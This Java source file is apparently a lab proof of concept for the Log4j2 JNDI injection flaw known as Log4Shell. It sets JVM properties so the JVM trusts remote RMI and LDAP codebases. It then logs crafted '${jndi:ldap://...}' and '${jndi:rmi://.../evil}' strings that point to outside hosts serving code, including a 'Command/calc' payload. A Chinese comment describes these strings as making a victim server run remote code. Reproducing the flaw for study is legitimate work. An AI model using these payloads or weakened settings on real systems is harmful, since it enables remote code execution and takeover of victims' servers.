package com.shiyue;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2 {

    private static Logger logger = LogManager.getLogger(Log4j2.class);

    public static void main(String[] args) {
        //有些高版本jdk需要打开此行代码
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        //模拟填写数据,输入构造好的字符串,使受害服务器打印日志时执行远程的代码 同一台可以使用127.0.0.1
        String username3 = "${java:os}";
        String username2 = "${java:hw}";
        String username1 = "${jndi:ldap://172.16.2.20:1389/Log4jTest}";
        String username = "${jndi:rmi://192.168.31.104:1099/evil}";
        //正常打印业务日志
        logger.error("params:{}",username3);
        logger.error("${jndi:ldap://172.16.2.20:1389/Basic/Command/calc}");
    }
}
